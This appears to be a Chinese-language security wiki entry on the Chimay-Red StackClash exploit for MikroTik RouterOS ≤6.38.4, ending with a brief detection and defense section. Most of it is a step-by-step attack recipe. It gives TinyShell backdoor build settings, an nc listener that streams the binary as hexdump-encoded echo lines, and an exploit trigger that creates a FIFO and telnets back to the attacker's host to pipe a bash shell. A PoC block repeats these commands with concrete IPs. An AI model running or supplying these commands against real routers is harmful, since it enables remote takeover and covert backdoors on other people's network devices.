---
id: iot-mikrotik-chimay-red-stackclash-tinyshell-upload
title: MikroTik RouterOS ≤6.38.4 Chimay-Red 漏洞利用：mknod+telnet 管道流式上传并运行 TinyShell 后门
type: scenario
domain: iot
path: iot
technique: mikrotik-chimay-red-stackclash-tinyshell-upload
aliases:
- Chimay-Red
- Chimay Red
- StackClash_x86.py
- RouterOS www 漏洞利用
- Vault 7 MikroTik
- mknod telnet bash 上传
- TinyShell 上传
tags:
- iot
- mikrotik
- routeros
- chimay-red
- stackclash
- rce
- backdoor
- tinyshell
- vault7
- router-exploit
cve: []
severity: critical
confidence: high
affected_versions: RouterOS <= 6.38.4
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-V441
  verified_at: '2026-11-09T22:04:31+08:00'
  notes: '已对照原文核对：图06 Chimay-Red README 明确 Vulnerable versions: Until RouterOS 6.38.4，原文复现环境 6.38.4；hexdump+echo -e 写 /ram/bash、mknod 管道 + telnet 回连、StackClash_x86.py 触发、tsh put busybox-i386 与图14-17 完全一致；affected_versions 已核对设为 RouterOS <= 6.38.4；原文未给 CVE 编号，cve 留空正确；未实测。'
---

## 一句话结论

Chimay-Red 利用 MikroTik RouterOS ≤6.38.4 的 `www` HTTP 服务栈冲突（StackClash）漏洞，在目标上以 ROP 链执行 bash 命令；把命令写成“`mknod /ram/f` 建管道 → telnet 连回攻击者 `nc` → 两端用 `/bin/bash` 互相喂管道”，攻击者即可边用 `hexdump`+`echo -e` 把静态编译的 TinyShell 逐行写入 `/ram/bash`，边完成上传、chmod 与启动，从而在无 wget/tftp 的 RouterOS 上得到一个常驻内存的加密后门。

## 原理

- **漏洞面**：RouterOS 的 `www` 服务（HTTP 管理界面，默认 80）在 ≤6.38.4 存在栈冲突类内存破坏，Chimay-Red 用两个线程把栈空间耗尽后触发 ROP，最终调用 bash 执行攻击者指定的命令。该利用在 Vault 7 泄露材料中被描述用于向路由器上传 HIVE/TinyShell 载荷。
- **为什么用管道上传**：RouterOS 内置 shell 工具极少，没有 wget/curl/tftp，且根文件系统只读；可利用的是 `/ram`（tmpfs，内存盘）。攻击者先让漏洞执行的命令创建 FIFO `/ram/f`，再 `telnet <攻击者IP> <端口> < /ram/f | /bin/bash > /ram/f`：本机 bash 从管道读到的每一行都会被执行，执行输出又写回管道回传给攻击者。
- **流式写文件**：攻击者一侧用 `nc -l` 监听，并把 `hexdump -v -e '"echo -e -n " 1024/1 "\\\\x%02X" " >> /ram/bash\n"' tshd` 的输出通过管道喂给 nc；目标 bash 收到的是大量 `echo -e -n "\x.." >> /ram/bash` 行，按序执行即在内存盘重建出完整的后门二进制，随后 `chmod 777 /ram/bash; /ram/bash` 启动。
- **为什么用 TinyShell**：Chimay-Red 自带的 shell 是明文通信、操作不便（上传文件需退出再调用）；TinyShell 通信加密、支持上传/下载和命令补全，更适合长期控制。其后门为 C 编写、静态编译后约 55KB，可在资源受限的路由器上运行。
- **持久性边界**：载荷位于 `/ram`，重启即丢失；若需持久化需另行写入调度任务/启动脚本（原文未涉及）。因此该链的主要价值是“漏洞利用 + 内存后门”的即时控制。

## 触发条件

- 目标为 MikroTik RouterOS ≤6.38.4，`www` 服务对攻击者可达（原文通过 WAN 侧 80 端口利用）。
- 攻击者能访问目标 80 端口，并能让目标主动外联攻击者的 nc 监听端口（telnet 出站未被过滤）。
- 目标架构与 Chimay-Red 脚本匹配（原文为 x86 的 `StackClash_x86.py`；项目另有 MIPS 版本）。
- 已准备与目标架构匹配的静态编译 TinyShell（改 `tsh.h` 的 secret/连接模式后编译）。

## 利用步骤

1. 确认目标 RouterOS 版本（WebFig 登录页/`/` 响应）≤6.38.4，`www` 对外开放。
2. 在攻击机准备 TinyShell：修改 `tsh.h` 的 `secret`、`SERVER_PORT`（默认 7586），正/反连模式按需注释 `CONNECT_BACK_HOST`；`Makefile` 使用 `-static` 编译出 `tshd`。
3. 攻击机启动监听并构造逐行写文件的管道：
   ```bash
   { echo "echo Uploading..."; \
     hexdump -v -e '"echo -e -n " 1024/1 "\\\\x%02X" " >> /ram/bash\n"' tshd | sed -e "s/\\\\\\\\x  //g"; \
     echo "chmod 777 /ram/bash"; echo "/ram/bash"; } | nc -l -q 0 -p 2345
   ```
4. 另开终端执行漏洞脚本，让 `www` 进程执行建管道并回连的命令：
   ```bash
   ./StackClash_x86.py <目标IP> 80 www_binary \
     "/bin/mknod /ram/f p; /bin/telnet <攻击机IP> 2345 < /ram/f | /bin/bash > /ram/f"
   ```
5. 等待脚本打印 ROP 链加载与 `Done!`，目标 bash 执行写入行，`/ram/bash` 重建并启动。
6. 用 TinyShell 客户端连接并确认 shell：
   ```bash
   ./tsh <目标IP>
   ```
7. 上传 busybox 扩展命令集并运行：
   ```bash
   ./tsh <目标IP> put busybox-i486 /ram/
   # 在 tsh 会话内
   cd /ram/; chmod 777 busybox-i486; ./busybox-i486
   ```

## PoC

```text
# 攻击机：nc 监听 + hexdump 逐行编码写入 /ram/bash
{ echo "echo Uploading..."; hexdump -v -e '"echo -e -n " 1024/1 "\\\\x%02X" " >> /ram/bash\n"' tshd | sed -e "s/\\\\\\\\x  //g"; echo "chmod 777 /ram/bash"; echo "/ram/bash"; } | nc -l -q 0 -p 2345

# 触发 StackClash，并让目标回连
./StackClash_x86.py 192.168.109.200 80 www_binary "/bin/mknod /ram/f p; /bin/telnet 192.168.109.140 2345 < /ram/f | /bin/bash > /ram/f"

# 连接正向 TinyShell（tsh.h 默认 SERVER_PORT 7586）
./tsh 192.168.109.200
```

## 变体与关联

- 变体：项目提供 `StackClash_mips.py`、`StackClash_resock_mips.py` 等，用于 MIPSBE/MIPSLE 设备；脚本与 `www_binary` 需匹配固件版本。
- 变体：Vault 7 指南使用 `download_and_exe_server.py` + `chimay_red.py` 的 `download_and_exe` 动作完成下载执行，本质仍是让漏洞进程执行远程下载/执行命令；netcat 管道法只是其中一种落地方式。
- 变体：CIA 使用的 TinyShell 变体（TshPatcher）命令行带 passphrase 参数（如 `tsh-x86_64 <ip> <port> MyPassphrase`），与开源版内置 `secret` 不同；分析流量时需先确认样本版本。
- 关联：[[defense-forensics-tinyshell-backdoor-traffic-decrypt]]（本链所用后门的流量解密）、[[web-generic-file-inclusion-mikrotik-winbox-cve-2018-14847-traversal-read]]（另一条 MikroTik 攻击面）、[[binary-pwn-stack-mikrotik-routeros-smb-netbios-cve-2018-7445-vdso-ret2syscall]]（RouterOS 的另一内存破坏利用）、[[iot-firmware-boa-pin-command-injection]]（嵌入式 Web 服务命令注入的同类思路）。
- 边界：仅影响 ≤6.38.4；WAN 侧 80/8291 关闭或仅内网可达时无法利用；telnet 出站被防火墙阻断时管道法失效；`/ram` 载荷重启丢失。

## 检测与防御

- 升级 RouterOS 到 6.38.5 以上（当前维护版本），这是最直接的修复。
- 管理面收敛：`www`/WinBox（8291）只监听内网，禁止 WAN 直连；用防火墙 input 链限制管理来源，启用 VPN 管理。
- 监测：`www` 进程异常崩溃/重启、路由器主动向外部端口发起 telnet、出现 `/ram/f`、`/ram/bash`、`/ram/busybox*` 等文件，均为强指标。
- 流量侧：检测路由器到外部的非常规 TCP 会话（尤其 7586 或高位端口）以及连接建立后立即出现的高熵二进制流；可用后门协议解密脚本确认。
- 应急：重启清除 `/ram` 载荷后，仍需检查 `/system scheduler`、`/system script`、`/tool netwatch` 等是否存在持久化配置。
